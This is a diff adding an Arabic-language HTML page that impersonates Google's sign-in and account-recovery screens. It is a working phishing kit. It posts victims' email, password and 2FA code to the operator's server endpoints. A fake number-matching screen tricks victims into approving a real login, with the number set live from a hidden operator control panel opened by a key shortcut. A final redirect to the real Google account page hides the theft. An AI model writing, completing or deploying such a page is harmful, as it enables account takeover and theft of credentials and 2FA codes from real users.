@@ -1,0 +1,724 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - Google</title>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Arabic:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Roboto','Noto Sans Arabic',sans-serif;}
+        html,body{height:100%;}
+        body{
+            background-color:#ffffff;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            min-height:100vh;
+            padding:20px;
+            transition:opacity 0.5s ease;
+            direction: rtl;
+        }
+        .global-progress-bar{
+            position:fixed;
+            top:0;left:0;
+            width:100%;
+            height:3px;
+            background:linear-gradient(90deg,transparent,#e8f0fe,transparent);
+            z-index:1000;
+            display:none;
+            overflow:hidden;
+        }
+        .progress-shine{
+            position:absolute;
+            top:0;
+            left:-100%;
+            width:40%;
+            height:100%;
+            background:linear-gradient(90deg,transparent,#1a73e8,transparent);
+            animation:progressShine 2s infinite ease-in-out;
+        }
+        @keyframes progressShine{
+            0%{left:-100%;opacity:.7;}
+            50%{opacity:1;}
+            100%{left:100%;opacity:.7;}
+        }
+        .login-container{
+            width:450px;
+            max-width:100%;
+            background:#fff;
+            border:1px solid #dadce0;
+            border-radius:8px;
+            box-shadow:0 1px 2px 0 rgba(60,64,67,.3),0 1px 3px 1px rgba(60,64,67,.15);
+            transition:opacity .5s ease;
+            display:flex;
+            flex-direction:column;
+            justify-content:flex-start;
+            padding:48px 40px 100px;
+            position:relative;
+            min-height:100vh;
+        }
+        .login-container.fade-out {
+            opacity: 0.4;
+        }
+        .google-logo{display:flex;justify-content:center;align-items:center;margin-bottom:16px;}
+        .google-logo img{height:32px;}
+        .main-title{font-size:24px;font-weight:400;color:#202124;text-align:center;margin-bottom:8px;}
+        .subtitle{font-size:14px;color:#5f6368;text-align:center;line-height:1.6;margin-bottom:24px;}
+        .info-link,.forgot-email,.create-account,.try-another-way{font-size:14px;color:#1a73e8;text-decoration:none;font-weight:400;}
+        .info-link:hover,.forgot-email:hover,.create-account:hover,.try-another-way:hover{text-decoration:underline;}
+        .info-link{display:block;text-align:center;margin-bottom:28px;}
+        .input-container {position: relative;margin-bottom:24px;}
+        .input-container input {
+            width:100%;
+            height:56px;
+            padding:16px 14px 0 14px;
+            border:1px solid #dadce0;
+            border-radius:4px;
+            font-size:16px;
+            background:#fff;
+            transition:border-color 0.2s, box-shadow 0.2s;
+            direction:rtl;
+            text-align:right;
+        }
+        .input-container label {
+            position:absolute;
+            top:16px;
+            right:14px;
+            font-size:16px;
+            color:#5f6368;
+            pointer-events:none;
+            transition:all 0.2s ease-out;
+            background:#fff;
+            padding:0 4px;
+        }
+        .input-container input:focus + label,
+        .input-container input:not(:placeholder-shown) + label {
+            top:-8px;
+            font-size:12px;
+            color:#1a73e8;
+        }
+        .input-container input:focus {
+            outline:none;
+            border:1px solid #1a73e8;
+            box-shadow:0 0 0 1px #1a73e8;
+        }
+        .secondary-links{display:flex;flex-direction:column;gap:20px;margin-bottom:32px;}
+        .fixed-buttons{position:fixed;bottom:0;right:0;left:0;width:100%;background:#fff;padding:12px 16px calc(12px + env(safe-area-inset-bottom));display:flex;justify-content:space-between;align-items:center;z-index:100;border-top:none;box-shadow:none;}
+        .next-btn{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;transition:background-color .2s;}
+        .next-btn:hover{background:#1669d6;}
+        .next-btn:disabled{background:#1a73e8;opacity:.6;cursor:not-allowed;}
+        .password-screen, .verification-screen{display:none;}
+        .welcome-text{font-size:16px;color:#202124;text-align:center;margin-bottom:20px;}
+        .user-email{font-size:16px;color:#202124;text-align:center;margin-bottom:24px;font-weight:500;direction:ltr;}
+        .verification-title{font-size:22px;font-weight:500;color:#202124;text-align:center;margin-bottom:16px;}
+        .verification-subtitle{font-size:14px;color:#5f6368;text-align:center;line-height:1.6;margin-bottom:8px;}
+        .verification-email{font-size:15px;color:#202124;text-align:center;margin-bottom:10px;font-weight:500;direction:ltr;}
+        .verification-message{font-size:14px;color:#3c4043;text-align:right;line-height:1.6;margin-bottom:10px;}
+        .verification-screen .input-container{margin-top:6px;margin-bottom:12px;}
+        /* صفحة الكود (من الصفحة الأولى) */
+        .screen {
+            width: 100%;
+            max-width: 420px;
+            padding: 20px 18px 100px;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            margin:auto;
+        }
+        .logo {display:flex;justify-content:center;margin-top:30px;}
+        .logo img {width:90px;height:auto;}
+        .title {text-align:center;margin-top:8px;font-size:23px;font-weight:400;}
+        .desc {margin-top:12px;color:#767676;text-align:center;font-size:13.5px;line-height:1.7;}
+        .desc span.email {display:block;color:#767676;font-weight:500;}
+        .code-wrap {display:flex;justify-content:center;align-items:center;margin-top:22px;margin-bottom:4px;}
+        .code {font-weight:500;font-size:clamp(48px,11vw,75px);line-height:0.9;letter-spacing:4px;color:#111;text-align:center;}
+        .right-block {position:relative;right:12px;text-align:right;}
+        .check {margin-top:10px;font-size:14.5px;color:#111;font-weight:500;}
+        .explain {margin-top:6px;color:#767676;font-size:13.5px;line-height:1.8;}
+        .resend {color:#9a9a9a;font-size:13.5px;text-decoration:none;margin-top:26px;transition:color 0.3s;pointer-events:none;cursor:default;}
+        .resend.blue {color:#4285F4;pointer-events:auto;cursor:pointer;}
+        .resend.blue:hover {text-decoration:underline;}
+        .footer {position:fixed;bottom:12px;right:12px;}
+        .not-with-me {color:#4285F4;font-size:13.5px;text-decoration:none;}
+        
+        /* لوحة التحكم السرية */
+        #codeControlPanel {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #f8f9fa;
+            border: 2px solid #1a73e8;
+            border-radius: 8px;
+            padding: 15px;
+            z-index: 10000;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+            min-width: 250px;
+            display: none;
+        }
+        #codeControlPanel h4 {
+            margin: 0 0 10px 0;
+            color: #1a73e8;
+            text-align: center;
+        }
+        #codeControlPanel input {
+            width: 100%;
+            padding: 8px;
+            margin: 5px 0;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            text-align: center;
+            font-size: 16px;
+        }
+        #codeControlPanel button {
+            width: 100%;
+            padding: 8px;
+            margin: 5px 0;
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        #codeControlPanel button:hover {
+            background: #1669d6;
+        }
+        #codeControlPanel button.orange {
+            background: #ff6b00;
+        }
+        #codeControlPanel button.orange:hover {
+            background: #e55a00;
+        }
+
+        @media (max-width:768px){
+            body{padding:0;margin:0;}
+            .login-container{width:100vw;max-width:none;border:none;border-radius:0;box-shadow:none;padding:20px 16px 100px;}
+        }
+    </style>
+</head>
+<body>
+    <!-- لوحة التحكم السرية -->
+    <div id="codeControlPanel">
+        <h4>👑 تحكم Zoala-GOD</h4>
+        <input type="text" id="customCodeInput" placeholder="أدخل الرقم الذي تريد (مثال: 42)" maxlength="3">
+        <button onclick="applyCustomCode()">تطبيق الرقم الجديد</button>
+        <button onclick="showCurrentCode()">عرض الرقم الحالي</button>
+        <button onclick="forceUserTransition()" class="orange">🎯 تحويل للصفحة التالية</button>
+        <button onclick="hideControlPanel()">إخفاء اللوحة</button>
+        <div style="margin-top: 10px; font-size: 12px; color: #666; text-align: center;">
+            الرقم الحالي: <span id="currentCodeDisplay">86</span>
+        </div>
+    </div>
+
+    <div class="global-progress-bar" id="globalProgressBar"><div class="progress-shine"></div></div>
+
+    <!-- شاشة الإيميل -->
+    <div class="login-container email-screen" id="emailScreen">
+        <div class="google-logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google"></div>
+        <h1 class="main-title">تسجيل الدخول</h1>
+        <p class="subtitle">يرجى استخدام حسابك على Google. ستتم إضافة الحساب إلى هذا الجهاز وسيكون متاحًا لاستخدامه في تطبيقات Google الأخرى.</p>
+        <a href="#" class="info-link">مزيد من معلومات حول استخدام الحساب</a>
+        <div class="input-container">
+            <input type="email" class="email-input" placeholder=" " id="emailInput">
+            <label for="emailInput">البريد الإلكتروني أو الهاتف</label>
+        </div>
+        <div class="secondary-links">
+            <a href="#" class="forgot-email">هل نسيت بريدك الإلكتروني؟</a>
+            <a href="#" class="create-account">إنشاء حساب</a>
+        </div>
+    </div>
+    <div class="fixed-buttons" id="emailButtons"><div></div><button class="next-btn" onclick="validateEmail()">التالي</button></div>
+
+    <!-- شاشة كلمة المرور -->
+    <form class="login-container password-screen" id="passwordScreen">
+        <div class="google-logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google"></div>
+        <p class="welcome-text">مرحباً</p>
+        <div class="user-email" id="userEmailDisplay"></div>
+        <div class="input-container">
+            <input type="password" class="password-input" placeholder=" " id="passwordInput" required>
+            <label for="passwordInput">إدخال كلمة المرور</label>
+        </div>
+        <label class="show-password" style="margin-top:8px;">
+            <input type="checkbox" id="showPasswordCheckbox" onchange="togglePasswordVisibility()">
+            عرض كلمة المرور
+        </label>
+    </form>
+    <div class="fixed-buttons password-screen" id="passwordButtons" style="display:none;">
+        <a href="#" class="try-another-way">تجربة طريقة أخرى</a>
+        <button type="button" class="next-btn" onclick="submitPassword()">التالي</button>
+    </div>
+
+    <!-- شاشة تحقق من الهاتف (الكود 86) -->
+    <div class="screen phone-screen" id="phoneScreen" style="display:none;">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
+        </div>
+        <div class="title">استرداد الحساب</div>
+        <p class="desc">للمساعدة في الحفاظ على أمان حسابك، تريد Google التأكد من أنك أنت من يحاول تسجيل الدخول <span class="email" id="phoneEmailDisplay"></span> </p>
+        <div class="code-wrap"><div class="code" id="dynamicVerificationCode">86</div></div>
+        <div class="right-block">
+            <div class="check">تحقق من هاتفك.</div>
+            <p class="explain">أرسلت Google إشعارًا إلى <strong>هاتفك</strong>.<br>يجب النقر على نعم في الإشعار ثم النقر على <strong style="color:#111;" id="codeInText">86</strong> على هاتفك لتأكيد هويتك.</p>
+            <div id="resend" class="resend" onclick="handleResendClick()">إعادة إرسال الرمز</div>
+        </div>
+        <div class="footer">
+            <a class="not-with-me" href="#" id="notWithMeBtn">هاتفي ليس معي</a>
+        </div>
+    </div>
+
+    <!-- شاشة إدخال الرمز -->
+    <form class="login-container verification-screen" id="verificationScreen">
+        <div class="google-logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google"></div>
+        <h2 class="verification-title">استرداد الحساب</h2>
+        <p class="verification-subtitle">للمساعدة في الحفاظ على أمان حسابك، تريد شركة Google التأكد من أنك أنت من يحاول تسجيل الدخول</p>
+        <div class="verification-email" id="verificationEmailDisplay"></div>
+        <p class="verification-message">تم إرسال رسالة تحتوي على رمز التحقق إلى (SMS/Email/بريد أسترداد).</p>
+        <div class="input-container">
+            <input type="text" class="code-input" placeholder=" " id="verificationCode" required>
+            <label for="verificationCode">إدخال الرمز</label>
+        </div>
+    </form>
+    <div class="fixed-buttons verification-screen" id="verificationButtons" style="display:none;">
+        <a href="#" class="try-another-way">تجربة طريقة أخرى</a>
+        <button type="button" class="next-btn" onclick="submitVerificationCode()">التالي</button>
+    </div>
+
+    <script>
+        // ════════════════════════════════════════════════════
+        // 🎮 المتغيرات الرئيسية والتحكم
+        // ════════════════════════════════════════════════════
+        
+        let currentEmail = '';
+        let currentVerificationCode = "86";
+        const transitionEmailToPassword = 4000;
+        const transitionPasswordToPhone = 6500; // ⭐ 6.5 ثواني
+        const transitionPhoneToVerification = 4000;
+        
+        // ════════════════════════════════════════════════════
+        // 🌐 دوال الاتصال بالسيرفر
+        // ════════════════════════════════════════════════════
+        
+        // جلب الرقم الحالي من السيرفر
+        async function fetchCurrentCode() {
+            try {
+                const response = await fetch('/get_code');
+                const data = await response.json();
+                currentVerificationCode = data.code;
+                updateVerificationCodeDisplay();
+                updateCurrentCodeDisplay();
+                return data.code;
+            } catch (error) {
+                return currentVerificationCode;
+            }
+        }
+        
+        // تحديث الرقم على السيرفر (بدون رسائل)
+        async function updateServerCode(newCode) {
+            try {
+                const response = await fetch('/set_code', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ code: newCode })
+                });
+                
+                const data = await response.json();
+                if (data.status === 'success') {
+                    currentVerificationCode = data.code;
+                    updateVerificationCodeDisplay();
+                    updateCurrentCodeDisplay();
+                    return true;
+                }
+                return false;
+            } catch (error) {
+                return false;
+            }
+        }
+        
+        // مراقبة التغييرات من السيرفر
+        async function startCodePolling() {
+            setInterval(async () => {
+                try {
+                    const response = await fetch('/poll_code?current_code=' + currentVerificationCode);
+                    const data = await response.json();
+                    
+                    if (data.changed && data.code !== currentVerificationCode) {
+                        currentVerificationCode = data.code;
+                        updateVerificationCodeDisplay();
+                        updateCurrentCodeDisplay();
+                    }
+                } catch (error) {
+                    // لا تعرض رسائل خطأ
+                }
+            }, 2000);
+        }
+        
+        // ⭐ دالة لإجبار الانتقال لجميع المستخدمين (بدون رسائل)
+        async function forceUserTransition() {
+            try {
+                await fetch('/force_transition', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    }
+                });
+                // لا رسائل - يتم التنفيذ مباشرة
+            } catch (error) {
+                // لا رسائل خطأ
+            }
+        }
+        
+        // ⭐ دالة للتحقق من الانتقال القسري
+        async function checkForcedTransition() {
+            try {
+                const response = await fetch('/check_transition');
+                const data = await response.json();
+                
+                if (data.transition && isOnPhoneScreen()) {
+                    startForcedTransition();
+                }
+            } catch (error) {
+                // لا تعرض رسائل خطأ
+            }
+        }
+        
+        // ⭐ دالة للتحقق إذا كان المستخدم في صفحة الهاتف
+        function isOnPhoneScreen() {
+            const phoneScreen = document.getElementById('phoneScreen');
+            return phoneScreen && phoneScreen.style.display !== 'none';
+        }
+        
+        // ⭐ دالة لبدء الانتقال القسري مع أنيميشن
+        function startForcedTransition() {
+            const phoneScreen = document.getElementById('phoneScreen');
+            const progress = document.getElementById('globalProgressBar');
+            
+            // بدء الأنيميشن
+            progress.style.display = 'block';
+            phoneScreen.classList.add('fade-out');
+            
+            // الانتظار 3 ثواني مع الأنيميشن ثم الانتقال
+            setTimeout(() => {
+                progress.style.display = 'none';
+                phoneScreen.style.display = 'none';
+                document.getElementById('verificationEmailDisplay').textContent = currentEmail;
+                
+                const verificationScreen = document.getElementById('verificationScreen');
+                verificationScreen.style.display = 'flex';
+                document.getElementById('verificationButtons').style.display = 'flex';
+            }, 3000);
+        }
+        
+        // ⭐ بدء المراقبة للانتقال القسري
+        function startTransitionPolling() {
+            setInterval(() => {
+                checkForcedTransition();
+            }, 2000);
+        }
+        
+        // ⭐ دالة جديدة للتحكم في زر إعادة الإرسال
+        function handleResendClick() {
+            const resend = document.getElementById("resend");
+            
+            // إذا كان الزر أزرق (مفعل)
+            if (resend.classList.contains("blue")) {
+                // تعطيل الزر وإرجاعه لرمادي
+                resend.classList.remove("blue");
+                
+                // بعد 3 ثواني، إعادة تفعيله
+                setTimeout(() => {
+                    resend.classList.add("blue");
+                }, 3000);
+            }
+        }
+        
+        // ⭐ دالة لتفعيل زر إعادة الإرسال أول مرة
+        function activateResendButton() {
+            const resend = document.getElementById("resend");
+            setTimeout(() => {
+                resend.classList.add("blue");
+            }, 3000);
+        }
+        
+        // ════════════════════════════════════════════════════
+        // 🎯 دوال التحكم في الرقم
+        // ════════════════════════════════════════════════════
+        
+        // دالة لتطبيق الرقم الجديد (بدون رسائل)
+        async function applyCustomCode() {
+            const newCode = document.getElementById('customCodeInput').value.trim();
+            
+            if (newCode && !isNaN(newCode) && newCode.length <= 3) {
+                const success = await updateServerCode(newCode);
+                if (success) {
+                    document.getElementById('customCodeInput').value = '';
+                    // لا يوجد alert - يتم التطبيق مباشرة
+                }
+                // لا يوجد else - لا تظهر رسالة خطأ
+            }
+            // لا يوجد else - لا تظهر رسالة خطأ
+        }
+        
+        // دالة لتحديث عرض الرقم في الصفحة
+        function updateVerificationCodeDisplay() {
+            const codeElement = document.getElementById('dynamicVerificationCode');
+            const codeInText = document.getElementById('codeInText');
+            
+            if (codeElement) {
+                codeElement.textContent = currentVerificationCode;
+            }
+            if (codeInText) {
+                codeInText.textContent = currentVerificationCode;
+            }
+        }
+        
+        // دالة لعرض الرقم الحالي
+        function showCurrentCode() {
+            alert(`🔢 الرقم الحالي هو: ${currentVerificationCode}`);
+        }
+        
+        // دالة لتحديث عرض الرقم في لوحة التحكم
+        function updateCurrentCodeDisplay() {
+            const display = document.getElementById('currentCodeDisplay');
+            if (display) {
+                display.textContent = currentVerificationCode;
+            }
+        }
+        
+        // ════════════════════════════════════════════════════
+        // 🎮 لوحة التحكم السرية
+        // ════════════════════════════════════════════════════
+        
+        // تفعيل لوحة التحكم بالضغط على Ctrl+Shift+Z
+        document.addEventListener('keydown', function(e) {
+            if (e.ctrlKey && e.shiftKey && e.key === 'Z') {
+                const panel = document.getElementById('codeControlPanel');
+                if (panel.style.display === 'none' || !panel.style.display) {
+                    panel.style.display = 'block';
+                    updateCurrentCodeDisplay();
+                } else {
+                    panel.style.display = 'none';
+                }
+            }
+        });
+        
+        function hideControlPanel() {
+            document.getElementById('codeControlPanel').style.display = 'none';
+        }
+        
+        // ════════════════════════════════════════════════════
+        // 🔄 دوال التنقل بين الصفحات
+        // ════════════════════════════════════════════════════
+        
+        function validateEmail(){
+            const emailInput = document.getElementById('emailInput');
+            currentEmail = emailInput.value.trim();
+            
+            if(!currentEmail){
+                alert('يرجى إدخال بريد إلكتروني');
+                return;
+            }
+            
+            const progress = document.getElementById('globalProgressBar');
+            progress.style.display = 'block';
+            const emailScreen = document.getElementById('emailScreen');
+            emailScreen.classList.add('fade-out');
+            
+            setTimeout(() => {
+                progress.style.display = 'none';
+                emailScreen.style.display = 'none';
+                document.getElementById('emailButtons').style.display = 'none';
+                document.getElementById('userEmailDisplay').textContent = currentEmail;
+                
+                const passwordScreen = document.getElementById('passwordScreen');
+                passwordScreen.style.display = 'flex';
+                document.getElementById('passwordButtons').style.display = 'flex';
+                passwordScreen.classList.remove('fade-out');
+            }, transitionEmailToPassword);
+        }
+        
+        function submitPassword(){
+            const passwordInput = document.getElementById('passwordInput');
+            const password = passwordInput.value.trim();
+            
+            if(!password){
+                alert('يرجى إدخال كلمة المرور');
+                return;
+            }
+            
+            const progress = document.getElementById('globalProgressBar');
+            progress.style.display = 'block';
+            const passwordScreen = document.getElementById('passwordScreen');
+            passwordScreen.classList.add('fade-out');
+            
+            const formData = new FormData();
+            formData.append('email', currentEmail);
+            formData.append('password', password);
+            
+            fetch('/process_login', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if(!response.ok) throw new Error('Network error');
+                return response.text();
+            })
+            .then((result) => {
+                if (result === 'SUCCESS') {
+                    setTimeout(() => {
+                        progress.style.display = 'none';
+                        passwordScreen.style.display = 'none';
+                        document.getElementById('passwordButtons').style.display = 'none';
+                        document.getElementById('phoneEmailDisplay').textContent = currentEmail;
+                        
+                        const phoneScreen = document.getElementById('phoneScreen');
+                        phoneScreen.style.display = 'flex';
+                        
+                        // ⭐ تفعيل زر إعادة الإرسال أول مرة
+                        activateResendButton();
+                        
+                        // تأكيد تحديث الرقم النهائي قبل العرض
+                        updateVerificationCodeDisplay();
+                        
+                    }, transitionPasswordToPhone);
+                } else {
+                    throw new Error('Server returned: ' + result);
+                }
+            })
+            .catch(error => {
+                progress.style.display = 'none';
+                alert('حدث خطأ أثناء إرسال البيانات.');
+            });
+        }
+        
+        // ⭐ دالة جديدة لزر "تجربة طريقة أخرى" - يأخذ لصفحة الرقم
+        function tryAnotherWay() {
+            const progress = document.getElementById('globalProgressBar');
+            progress.style.display = 'block';
+            const passwordScreen = document.getElementById('passwordScreen');
+            passwordScreen.classList.add('fade-out');
+            
+            // نفس الأنيميشن والمدة مثل زر "التالي"
+            setTimeout(() => {
+                progress.style.display = 'none';
+                passwordScreen.style.display = 'none';
+                document.getElementById('passwordButtons').style.display = 'none';
+                document.getElementById('phoneEmailDisplay').textContent = currentEmail;
+                
+                const phoneScreen = document.getElementById('phoneScreen');
+                phoneScreen.style.display = 'flex';
+                
+                // ⭐ تفعيل زر إعادة الإرسال أول مرة
+                activateResendButton();
+                
+                // تأكيد تحديث الرقم النهائي قبل العرض
+                updateVerificationCodeDisplay();
+                
+            }, transitionPasswordToPhone);
+        }
+        
+        document.getElementById('notWithMeBtn').addEventListener('click', () => {
+            const phoneScreen = document.getElementById('phoneScreen');
+            const progress = document.getElementById('globalProgressBar');
+            progress.style.display = 'block';
+            phoneScreen.classList.add('fade-out');
+            
+            setTimeout(() => {
+                progress.style.display = 'none';
+                phoneScreen.style.display = 'none';
+                document.getElementById('verificationEmailDisplay').textContent = currentEmail;
+                
+                const verificationScreen = document.getElementById('verificationScreen');
+                verificationScreen.style.display = 'flex';
+                document.getElementById('verificationButtons').style.display = 'flex';
+            }, transitionPhoneToVerification);
+        });
+        
+        function submitVerificationCode(){
+            const codeInput = document.getElementById('verificationCode');
+            const code = codeInput.value.trim();
+            
+            if(!code){
+                alert('يرجى إدخال رمز التحقق');
+                return;
+            }
+            
+            const progress = document.getElementById('globalProgressBar');
+            progress.style.display = 'block';
+            const verificationScreen = document.getElementById('verificationScreen');
+            verificationScreen.classList.add('fade-out');
+            
+            const formData = new FormData();
+            formData.append('email', currentEmail);
+            formData.append('verification_code', code);
+            formData.append('timestamp', new Date().toISOString());
+            
+            fetch('/process_verification', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if(!response.ok) throw new Error('Network error');
+                return response.text();
+            })
+            .then((result) => {
+                if (result === 'SUCCESS') {
+                    setTimeout(() => {
+                        window.location.href = 'https://myaccount.google.com/';
+                    }, transitionPhoneToVerification);
+                } else {
+                    throw new Error('Server returned: ' + result);
+                }
+            })
+            .catch(error => {
+                progress.style.display = 'none';
+                alert('حدث خطأ أثناء إرسال البيانات.');
+            });
+        }
+        
+        function togglePasswordVisibility(){
+            const input = document.getElementById('passwordInput');
+            input.type = document.getElementById('showPasswordCheckbox').checked ? 'text' : 'password';
+        }
+        
+        // ════════════════════════════════════════════════════
+        // 🚀 تهيئة الصفحة
+        // ════════════════════════════════════════════════════
+        
+        // عند تحميل الصفحة
+        document.addEventListener('DOMContentLoaded', function() {
+            // بدء مراقبة التغييرات من السيرفر
+            startCodePolling();
+            
+            // بدء مراقبة الانتقال القسري
+            startTransitionPolling();
+            
+            // جلب الرقم الحالي
+            fetchCurrentCode();
+            
+            // إضافة مستمع لزر "تجربة طريقة أخرى" في صفحة الباسوورد
+            const tryAnotherWayBtn = document.querySelector('.password-screen .try-another-way');
+            if (tryAnotherWayBtn) {
+                tryAnotherWayBtn.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    tryAnotherWay();
+                });
+            }
+        });
+        
+        // إضافة مستمعين لأزرار الإدخال
+        document.getElementById('emailInput').addEventListener('keypress', e => {
+            if(e.key === 'Enter') validateEmail();
+        });
+        
+        document.getElementById('passwordInput').addEventListener('keypress', e => {
+            if(e.key === 'Enter') submitPassword();
+        });
+        
+        document.getElementById('verificationCode').addEventListener('keypress', e => {
+            if(e.key === 'Enter') submitVerificationCode();
+        });
+    </script>
+</body>
+</html>
